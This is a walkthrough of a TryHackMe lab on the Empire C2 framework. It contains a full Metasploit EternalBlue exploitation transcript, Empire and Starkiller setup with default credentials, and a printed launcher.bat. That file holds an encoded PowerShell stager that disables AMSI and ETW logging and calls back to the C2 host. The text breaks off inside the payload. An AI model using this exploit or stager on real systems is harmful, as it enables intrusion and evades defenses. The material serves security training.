# Empire

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Walkthrough
Difficulty: Easy
Tags: Windows
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
Subscription type: Free
Description:
Learn how to use Empire and it's GUI Starkiller, a powerful post-exploitation C2 framework.
```

Room link: [https://tryhackme.com/room/rppsempire](https://tryhackme.com/room/rppsempire)

## Solution

### Task 1: Introduction

**Empire**, a C2 or Command and Control server created by BC-Security, used to deploy agents onto a device and remotely run modules. Empire is a free and open-source alternative to other command and control servers like the well known Cobalt Strike C2. In this room, we will cover the basics of setting up a listener and stager as well as what types are available, then learn how to use an agent on a device.

The virtual machine used in this room is [Blue](https://tryhackme.com/room/blue) created by [DarkStar7417](https://tryhackme.com/p/DarkStar7471) you can download the box for offline use [here](https://www.darkstar7471.com/resources.html) or deploy the box on Tryhackme in Task 2.

Before completing this room we recommend completing the '[What the Shell](https://tryhackme.com/room/introtoshells)' room by [MuirlandOracle](https://tryhackme.com/p/MuirlandOracle) and '[Blue](https://tryhackme.com/room/blue)' by [DarkStar7471](https://tryhackme.com/p/DarkStar7471). If you have a general understanding of basic reverse shells and exploitation techniques then you will be ready to begin.

For future updates and rooms, follow [@DarkStar7471](https://twitter.com/darkstar7471) and [@Cryillic](https://twitter.com/Real_Cryillic) on Twitter.

---------------------------------------------------------------------------

### Task 2: Deploy

Before we can move on to using Empire we need to deploy a machine to connect the Empire server with.

Deploy this machine and discover what exploit this machine is vulnerable to. The virtual machine used in this room (Blue) can be downloaded for offline usage from `https://darkstar7471.com/resources.html`.

We recommend completing the room '[Blue](https://tryhackme.com/room/blue)' prior to this room for this purpose alone.

---------------------------------------------------------------------------

#### Exploit the vulnerability and get a reverse shell

Hint: Complete the Blue room prior to this room.

We know from [Blue](Blue.md) that the machine is vulnerable for MS17-010.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Empire]
└─$ msfconsole -q
msf > search ms17-010

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   23    \_ AKA: ETERNALBLUE                          .                .        .      .
   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
   26    \_ AKA: ETERNALBLUE                          .                .        .      .
   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   28    \_ target: Execute payload (x64)             .                .        .      .
   29    \_ target: Neutralize implant                .                .        .      .


Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'

msf > use 2
[*] Additionally setting TARGET => Windows 7
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.144.77
LHOST => 192.168.144.77
msf exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.66.170.197
RHOSTS => 10.67.134.238
msf exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.66.170.197    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.144.77   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Windows 7



View the full module info with the info, or info -d command.

msf exploit(windows/smb/ms17_010_eternalblue) > exploit
[*] Started reverse TCP handler on 192.168.144.77:4444 
[*] 10.67.134.238:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.67.134.238:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.21/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 10.67.134.238:445     - Scanned 1 of 1 hosts (100% complete)
[+] 10.67.134.238:445 - The target is vulnerable.
[*] 10.67.134.238:445 - Connecting to target for exploitation.
[+] 10.67.134.238:445 - Connection established for exploitation.
[+] 10.67.134.238:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.67.134.238:445 - CORE raw buffer dump (42 bytes)
[*] 10.67.134.238:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.67.134.238:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.67.134.238:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.67.134.238:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.67.134.238:445 - Trying exploit with 12 Groom Allocations.
[*] 10.67.134.238:445 - Sending all but last fragment of exploit packet
[*] 10.67.134.238:445 - Starting non-paged pool grooming
[+] 10.67.134.238:445 - Sending SMBv2 buffers
[+] 10.67.134.238:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.67.134.238:445 - Sending final SMBv2 buffers.
[*] 10.67.134.238:445 - Sending last fragment of exploit packet!
[*] 10.67.134.238:445 - Receiving response from exploit packet
[+] 10.67.134.238:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.67.134.238:445 - Sending egg to corrupted connection.
[*] 10.67.134.238:445 - Triggering free of corrupted buffer.
[*] Sending stage (203846 bytes) to 10.66.170.197
[*] Meterpreter session 1 opened (192.168.144.77:4444 -> 10.66.170.197:49712) at 2026-02-06 19:35:49 +0100
[+] 10.67.134.238:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.67.134.238:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.67.134.238:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > pwd
C:\Windows\system32
meterpreter > cd ..
meterpreter > cd ..
meterpreter > pwd
C:\
meterpreter > 
```

### Task 3: Installation

The installation for Empire and Starkiller very easy and can all be done from the command line. The choice is up to you on whether or not you want to use the GUI for Empire, the room itself will showcase Starkiller but all functionalities are the same.

For further instructions on installing Empire refer to the [BC-Security Github](https://github.com/BC-SECURITY/Empire).

![Empire 1](Images/Empire_1.jpg)

Note: Starkiller is the GUI for Empire is not required however it will be used within this room.

For more information about Empire check out the [BC-Security blog](https://www.bc-security.org/blog).

Note: If you are using the attackbox, read the Usage instruction at `/root/Instructions/empire-starkiller.txt`.

#### Installing Empire

We can begin by installing Empire on our device. Follow the instructions below to install Empire.

1. `cd /opt`
2. `git clone https://github.com/BC-SECURITY/Empire/`
3. `cd /opt/Empire`
4. `./setup/install.sh`

#### Installing Starkiller

Once Empire is installed we can install the GUI for Empire known as Starkiller.

1. `cd /opt`
2. Download an up to date version of Starkiller from the BC-Security Github repo - `https://github.com/BC-SECURITY/Starkiller/releases`
3. `chmod +x starkiller-0.0.0.AppImage`

#### Starting Empire

Once both Empire and Starkiller are installed we can start both servers. Being by starting Empire with the instructions below.

1. `cd /opt/Empire`
2. `./empire --rest`

#### Starting Starkiller

Once Empire is started follow the instructions below to start Starkiller.

1. `cd /opt`
2. `./starkiller-0.0.0.AppImage`
3. Login to Starkiller

#### Default Credentials

- **Uri**: `127.0.0.1:1337`
- **User**: `empireadmin`
- **Pass**: `password123`

Once you have logged into Starkiller you should be greeted with the Listeners menu, once you have Starkiller or Empire ready move on to Task 3 to get familiar with the menu.

#### Docker installation

Docker installation as described in the [Empire Wiki](https://bc-security.gitbook.io/empire-wiki/quickstart/installation).

I ended up using an older version (v4.3.3) due to the fact that only PowerShell version 2 is available on the target machine.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Empire]
└─$ docker run -it -p 1337:1337 -p 12345:12345 -p 12346:12346 bcsecurity/empire:v4.3.3
Unable to find image 'bcsecurity/empire:v4.3.3' locally
v4.3.3: Pulling from bcsecurity/empire
9b99af5931b3: Pull complete 
b6013b3e77fe: Pull complete 
bbced17b6899: Pull complete 
8b609dabefa8: Pull complete 
50544bfef33d: Pull complete 
2647658ee6c7: Pull complete 
bfbcd80e2a89: Pull complete 
0f842ec5cda3: Pull complete 
e817c2d856fa: Pull complete 
10ee4b5e385a: Pull complete 
b4cdf1edb84c: Pull complete 
de9ed23f47a9: Pull complete 
01fa5dd6319b: Pull complete 
66b6ee9c4ad4: Pull complete 
b1cf061886f7: Pull complete 
ba51b34f3313: Pull complete 
d140d0623007: Pull complete 
2636d8a1f7bb: Pull complete 
Digest: sha256:95ee4fa94afae3a83309b26964727fc61969aa46443fab97ac7ed7f0c83f6480
Status: Downloaded newer image for bcsecurity/empire:v4.3.3
Skipping virtualenv creation, as specified in config file.
[*] Loading default config
[*] Setting up database.
[*] Adding default user.
[*] Adding database config.
[*] Generating random staging key
[*] Adding default bypasses.
[*] Adding default keyword obfuscation functions.
<---snip--->
```

In addition of port 1337 for the Starkiller GUI, we configure two additional ports (12345, 12346) for listeners.

We also need an older version of Starkiller that is compatible with the older Empire version

```bash
┌──(kali㉿kali)-[/opt]
└─$ sudo mkdir Starkiller             

┌──(kali㉿kali)-[/opt]
└─$ cd Starkiller 

┌──(kali㉿kali)-[/opt/Starkiller]
└─$ sudo wget https://github.com/BC-SECURITY/Starkiller/releases/download/v1.10.0/starkiller-1.10.0.AppImage
--2026-02-07 10:49:06--  https://github.com/BC-SECURITY/Starkiller/releases/download/v1.10.0/starkiller-1.10.0.AppImage
Resolving github.com (github.com)... 4.225.11.194
Connecting to github.com (github.com)|4.225.11.194|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://release-assets.githubusercontent.com/github-production-release-asset/245954108/ab9f9071-e8ce-4d1f-af9b-77771ce48f82?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-02-07T10%3A36%3A41Z&rscd=attachment%3B+filename%3Dstarkiller-1.10.0.AppImage&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-02-07T09%3A36%3A34Z&ske=2026-02-07T10%3A36%3A41Z&sks=b&skv=2018-11-09&sig=ec5f4Kjv19E%2BSxSo%2BzibVMgg5ZTirLNRxLAbTXGrGog%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc3MDQ1OTUxNCwibmJmIjoxNzcwNDU3NzE0LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.geefF-9K1GejCfjK42ZaTej-BP_WwILNqoCamqVGfUw&response-content-disposition=attachment%3B%20filename%3Dstarkiller-1.10.0.AppImage&response-content-type=application%2Foctet-stream [following]
--2026-02-07 10:49:06--  https://release-assets.githubusercontent.com/github-production-release-asset/245954108/ab9f9071-e8ce-4d1f-af9b-77771ce48f82?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-02-07T10%3A36%3A41Z&rscd=attachment%3B+filename%3Dstarkiller-1.10.0.AppImage&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-02-07T09%3A36%3A34Z&ske=2026-02-07T10%3A36%3A41Z&sks=b&skv=2018-11-09&sig=ec5f4Kjv19E%2BSxSo%2BzibVMgg5ZTirLNRxLAbTXGrGog%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc3MDQ1OTUxNCwibmJmIjoxNzcwNDU3NzE0LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.geefF-9K1GejCfjK42ZaTej-BP_WwILNqoCamqVGfUw&response-content-disposition=attachment%3B%20filename%3Dstarkiller-1.10.0.AppImage&response-content-type=application%2Foctet-stream
Resolving release-assets.githubusercontent.com (release-assets.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.108.133, ...
Connecting to release-assets.githubusercontent.com (release-assets.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 88991007 (85M) [application/octet-stream]
Saving to: ‘starkiller-1.10.0.AppImage’

starkiller-1.10.0.AppImage                          100%[================================================================================================================>]  84.87M  34.0MB/s    in 2.5s    

2026-02-07 10:49:09 (34.0 MB/s) - ‘starkiller-1.10.0.AppImage’ saved [88991007/88991007]


┌──(kali㉿kali)-[/opt/Starkiller]
└─$ ls -l
total 86908
-rw-r--r-- 1 root root 88991007 Mar 17  2022 starkiller-1.10.0.AppImage

┌──(kali㉿kali)-[/opt/Starkiller]
└─$ sudo chmod +x starkiller-1.10.0.AppImage                                                                

┌──(kali㉿kali)-[/opt/Starkiller]
└─$ sudo ./starkiller-1.10.0.AppImage --no-sandbox
libva error: vaGetDriverNames() failed with unknown libva error

```

Then login with:

- **Username**: `empireadmin`
- **Password**: `password123`

![Starkiller 1](Images/Starkiller_1.png)

---------------------------------------------------------------------------

### Task 4: Menu Overview

Now that we have Empire and Starkiller installed and running we can take a brief tour of the GUI to see some of the main features Empire has to offer. You will notice six different main tabs that you will interact with the most each one is outlined below.

- **Listeners** - Similar to Netcat or multi/handler for receiving back stagers.
- **Stagers** - Similar to a payload with further functionality for deploying agents.
- **Agents** - Used to interact with agents on the device to perform "tasks".
- **Modules** - Modules that can be used as tools or exploits.
- **Credentials** - Reports all credentials found when using modules.
- **Reporting** - A report of every module and command run on each agent.

![Empire 2](Images/Empire_2.webp)

#### Listeners

The first menu you will see is a listeners menu. This menu will allow you to create and list what listeners you have available. Listeners will listen on a specific port similar to Netcat or multi handler.

![Empire 3](Images/Empire_3.png)

#### Stagers

Stagers will be the second point to getting an agent to connect back to your C2 server. This menu similar to the listener menu will allow you to create and list what stagers you have available. Stagers will send off an agent similar to a payload.

![Empire 4](Images/Empire_4.png)

#### Agents

Agents will be where you do a majority of interaction in Starkiller. This menu will allow you to see an overview of all agents and interact with specific agents. Agents are like shells back to the device, you can send shell commands and modules from agents.

![Empire 5](Images/Empire_5.png)

#### Modules

The Modules menu will give you an overview of all modules available and allow you to search for a particular module. Modules are specific tools and exploits that can be used with agents like enumeration scripts, privilege escalation methods, and exploits.

![Empire 6](Images/Empire_6.png)

#### Credentials

The Credentials menu is a very useful menu in Starkiller that will save any enumerated credentials found from a device or module. It can either save hashes or plaintext passes; you can also manually add any credentials it does not auto collect.

![Empire 7](Images/Empire_7.png)

#### Reporting

The Reporting menu is another useful menu that allows you to see shell commands or modules that you have run in the past and report them to this menu, making it great for looking back at your work.

![Empire 8](Images/Empire_8.png)

---------------------------------------------------------------------------

### Task 5: Listeners

#### Listeners Overview

Listeners are used in Empire similar to how they are used in any other normal listener like Netcat and multi/handler. These listeners can have some very useful functionality that can help with agent management as well as concealing your traffic / evading detections. Below you can find an outline of the available listeners and their uses.

- http - This is the standard listener that utilizes HTTP to listen on a specific port.

The next four commands use variations of HTTP COMs to generate a listener, this is out of scope for this room; however, I encourage you to do your own research on HTTP COMs and how they can be used to conceal traffic.

- http_com - Uses the standard HTTP listener with an IE COM object.
- http_foreign - Used to point to a different Empire server.
- http_hop - Used for creating an external redirector using PHP.
- http_mapi - Uses the standard HTTP listener with a MAPI COM object.

The next five commands all use variations of built out services or have unique features that make them different from other listeners.

- meterpreter -  Used to listen for Metasploit stagers.
- onedrive - Utilizes OneDrive as the listening platform.
- redirector - Used for creating pivots in a network.
- dbx - Utilizes Dropbox as the listening platform.
- http_malleable - Used alongside the malleable C2 profiles from BC-Security.

There is also the ability to create custom malleable c2 listeners that act as beacons to emulate certain threats or APTs however that is out of scope for this room. For more information refer to the [BC-Security blog](https://www.bc-security.org/post/empire-malleable-c2-profiles/).

For the purposes of this room, we will be utilizing the HTTP listener.

#### Creating a Listener

Step 1 - Navigate to the listeners tab and select 'CREATE LISTENER'

![Empire 9](Images/Empire_9.png)

Step 2 - Select your listener type, for the demo, we'll use an HTTP listener.

![Empire 10](Images/Empire_10.png)

Step 3 - Configure your listener, the only two options you will need to change are the host IP and the host port.

![Empire 11](Images/Empire_11.png)

The menu for creating a listener gives us many options to choose from. These option fields will change from listener to listener. Below is an outline of each field present for the HTTP listener and how they can be used and adjusted.

- Name - Specify what name the listener shows up as in the listener menu.
- Host - IP to connect back to.
- Port - Port to listen on.
- BindIP - IP to bind to (typically localhost / 0.0.0.0)

These options can be used for specifying how the listener operates and runs when started and while running.

- DefaultDelay
- DefaultJitter
- DefaultLostLimit

The following options can be useful for bypassing detection techniques and creating more complex listeners.

- DefaultProfile - Will allow you to specify the profile used or User-Agent.
- Headers - Since this is an HTTP listener it will specify HTTP headers.
- Launcher - What launcher to use for the listener this will be prefixed on the stager.

Step 4 - After pressing submit, we now have an active listener on port 4444.

![Empire 12](Images/Empire_12.png)

---------------------------------------------------------------------------

#### Read the above and create an HTTP listener

![Starkiller 2](Images/Starkiller_2.png)

![Starkiller 3](Images/Starkiller_3.png)

### Task 6: Stagers

#### Stagers Overview

Starkiller uses a listener and a stager to create an agent the listener does exactly as it sounds like it, it listens on a given port for a connection back from your agent. The stager is similar to a payload or reverse-shell that you would send to the target to get an agent back. There is a large number of stagers available we will only cover a handful of the stagers and their uses then use two to demonstrate their uses. Below is an outline of a handful from the possible list of stagers to choose from.

Empire has multiple parts to each stage to help identify each one. First is the platform this can include multi, OSx, and Windows. Second the stager type itself / launcher.

Below are 3 stagers that are general purpose and can be used as your basic stagers. multi/launcher is the most all-purpose stager and can be used for a variety of scenarios, this is the stager we will use for demo purposes in this room.

- multi/launcher - A fairly universal stager that can be used for a variety of devices.
- windows/launcher_bat - Windows Batch file
- multi/bash - Basic Bash Stager

You can also use stagers for more specific applications similar to the listeners. These can be anything from macro code to ducky code for USB attacks.

- windows/ducky - Ducky script for the USB Rubber Ducky for physical USB attacks.
- windows/hta - HTA server an HTML application protocol that can be used to evade AV.
- osx/applescript - Stager in AppleScript: Apple's own programming language.
- osx/teensy - Similar to the rubber ducky is a small form factor micro-controller for physical attacks.

Each stager can have its own uses and strengths to it. For this room, we will be using multi/launcher and windows/launcher_bat to continue throughout the room.

#### Generating a Stager

Step 1 - Go to the stagers tab and select 'GENERATE STAGER'.

![Empire 13](Images/Empire_13.png)

Step 2 - Select your stager type, for our demo, we’ll use windows/launcher_bat.

![Empire 14](Images/Empire_14.png)

Step 3 - Set the listener to the one you made in the previous task.

![Empire 15](Images/Empire_15.png)

The menu for creating a stager does not have many options but can allow you to customize each stager to your liking, with the listener of your choosing. The stager menu can come with various options depending on the stager selected as well as optional fields.

- Listener - Select which listener to use from a list of created listeners on the Empire server.
- Base64 - Enable or disable stager encoding with base64.
- Language - Language used to create the stager: bash, PowerShell, Python, etc.
- SafeChecks - Enable or disable checks for the stager.

I encourage you to explore more of the optional fields; however, these are out of scope for this room. Some of the optional fields include ASMIBypass, Obfuscate, ETWBypass, etc.

Step 4 - We now have a stager ready to deploy to our target depending on the stager type you selected you will have to either download or copy and paste the stager to the target machine.

![Empire 16](Images/Empire_16.png)

#### Transferring & Executing the Stager

**Attacking Machine**:

There are many ways that you can send the stager to the target machine, including SCP, phishing, and malware droppers; for this example, we will use a basic python3 server and wget to transfer the stager.

1. `python3 -m http.server`

**Target Machine**:

1. `wget TUN0_IP:8000/launcher.bat -outfile launcher.bat`
2. `./launcher.bat`

![Empire 17](Images/Empire_17.png)

Below is what the multi/launcher PowerShell payload will look like with the `powershell -noP -sta -w 1 -enc` launcher that we provided when creating the listener. The launcher will take the encoded payload and decode then run it, in this case, the payload will still get picked up by AV however you can adjust the launching and obfuscation commands to bypass AV or other detections.

![Empire 18](Images/Empire_18.png)

---------------------------------------------------------------------------

#### Read the above and create a basic multi/launcher stager using the HTTP listener you created in Task 5

First we create the stager

![Starkiller 4](Images/Starkiller_4.png)

![Starkiller 5](Images/Starkiller_5.png)

which looks like this

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Empire]
└─$ cat launcher.bat 
# 2>NUL & @CLS & PUSHD "%~dp0" & "%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -nol -nop -ep bypass "[IO.File]::ReadAllText('%~f0')|iex" & DEL "%~f0" & POPD /B
powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAFIAcwBJAG8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAE8AcgAgAC0AZwBlACAAMwApAHsAJABSAEUAZgA9AFsAUgBFAEYAXQAuAEEAcwBTAGUAbQBiAEwAWQAuAEcAZQB0AFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAFQARgBpAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAGEATAB1AGUAKAAkAE4AdQBMAEwALAAkAHQAcgB1AEUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgAiAEcAZQB0AEYAaQBlAGAAbABkACIAKAAnAG0AXwBlACcAKwAnAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuACcAKwAnAFAAdQBiAGwAaQBjACwAJwArACcASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQAnACsAJwBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAJwArACcAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgAiAEcAZQB0AEYAaQBlAGAAbABkACIAKAAnAGUAdAAnACsAJwB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgAnACsAJwBsAGkAYwAsAFMAJwArACcAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwBZAFMAdABlAE0ALgBOAGUAVAAuAFMAZQByAFYAaQBjAGUAUABPAGkATgB0AE0AQQBuAEEAZwBlAHIAXQA6ADoARQBYAFAAZQBDAHQAMQAwADAAQwBvAE4AdABJAE4AVQBFAD0AMAA7ACQANQA2ADYAPQBOAEUAVwAtAE8AQgBKAEUAYwBUACAAUwBZAFMAdABFAE0ALgBOAGUAdAAuAFcARQBCAEMAbABJAEUAbgB0ADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7ACQAcwBlAHIAPQAkACgAWwBUAGUAWABUAC4ARQBOAGMAbwBEAGkATgBHAF0AOgA6AFUATgBJAGMAbwBkAGUALgBHAGUAVABTAHQAcgBJAE4ARwAoAFsAQwBvAE4AVgBFAHIAdABdADoAOgBGAHIATwBNAEIAQQBTAGUANgA0AFMAdAByAGkAbgBHACgAJwBhAEEAQgAwAEEASABRAEEAYwBBAEEANgBBAEMAOABBAEwAdwBBAHgAQQBEAGsAQQBNAGcAQQB1AEEARABFAEEATgBnAEEANABBAEMANABBAE0AUQBBADAAQQBEAFEAQQBMAGcAQQAzAEEARABjAEEATwBnAEEAeABBAEQASQBBAE0AdwBBADAAQQBEAFUAQQAnACkAKQApADsAJAB0AD0AJwAvAG4AZQB3AHMALgBwAGgAcAAnADsAJAA1ADYANgAuAEgAZQBBAEQARQByAFMALgBBAEQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADUANgA2AC4AUABSAE8AeAB5AD0AWwBTAFkAcwB0AGUAbQAuAE4AZQBUAC4AVwBFAGIAUgBlAFEAVQBFAHMAVABdADoAOgBEAEUAZgBhAHUATABUAFcARQBiAFAAUgBPAHgAeQA7ACQANQA2ADYALgBQAHIATwB4AHkALgBDAFIARQBkAEUAbgB0AEkAQQBsAHMAIAA9ACAAWwBTAHkAUwB0AGUAbQAuAE4AZQB0AC4AQwBSAEUAZABFAE4AVABpAGEATABDAGEAQwBoAGUAXQA6ADoARABFAEYAQQB1AGwAVABOAEUAVABXAG8AUgBrAEMAcgBlAEQARQBuAHQAaQBhAEwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA1ADYANgAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAFMAdABlAG0ALgBUAEUAeABUAC4ARQBOAGMATwBEAEkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcARQBUAEIAWQB0AEUAUwAoACcAWwA/AGkAXgBAADAAbAAoAFIAMQBOAHIAUQA2AHQAIwB1AHMALgB8AD0ASQBoADoAQwBYAGoANwBVADMAeQA4ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAFUATgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABvAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQANQA2ADYALgBIAEUAQQBkAG